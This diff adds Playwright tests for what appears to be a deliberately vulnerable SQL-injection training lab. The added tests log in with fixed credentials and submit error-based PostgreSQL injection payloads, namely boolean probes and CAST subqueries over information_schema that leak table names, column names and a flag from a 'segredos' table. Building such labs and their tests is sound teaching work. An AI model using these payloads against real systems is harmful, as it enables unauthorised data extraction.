@@ -85,3 +85,47 @@ test.describe('Level 1-3: UNION-Based DB Enumeration', () => {
     await expect(rows.filter({ hasText: 'cristiano' }).filter({ hasText: 'goat7' }).first()).toBeVisible()
   })
 })
+
+test.describe('Level 1-4: Error-Based Data Extraction', () => {
+  test.beforeEach(async ({ page }) => {
+    await page.goto('/login')
+    await page.fill('#username', 'cristiano')
+    await page.fill('#password', 'goat7')
+    await page.click('[type="submit"]')
+    await page.waitForURL(/\/dashboard/)
+    await page.goto('/dashboard/perfil')
+  })
+
+  test('step 1 - true condition returns found', async ({ page }) => {
+    await page.fill('.lookup-bar input', '1 AND 1=1--')
+    await page.click('.search-btn')
+    await expect(page.locator('.result-found')).toBeVisible()
+  })
+
+  test('step 2 - false condition returns not found (injection confirmed)', async ({ page }) => {
+    await page.fill('.lookup-bar input', '1 AND 1=2--')
+    await page.click('.search-btn')
+    await expect(page.locator('.result-not-found')).toBeVisible()
+  })
+
+  test('step 3 - CAST error leaks table name from information_schema', async ({ page }) => {
+    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INTEGER)--")
+    await page.click('.search-btn')
+    await expect(page.locator('.error-msg')).toBeVisible()
+    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
+  })
+
+  test('step 4 - CAST error leaks column name from segredos', async ({ page }) => {
+    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='segredos' LIMIT 1 OFFSET 0) AS INTEGER)--")
+    await page.click('.search-btn')
+    await expect(page.locator('.error-msg')).toBeVisible()
+    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
+  })
+
+  test('step 5 - CAST error leaks flag from segredos.valor', async ({ page }) => {
+    await page.fill('.lookup-bar input', '1 AND 1=CAST((SELECT valor FROM segredos LIMIT 1) AS INTEGER)--')
+    await page.click('.search-btn')
+    await expect(page.locator('.error-msg')).toContainText('JUMENTOS{')
+    await expect(page.locator('.congrats-banner')).toBeVisible()
+  })
+})
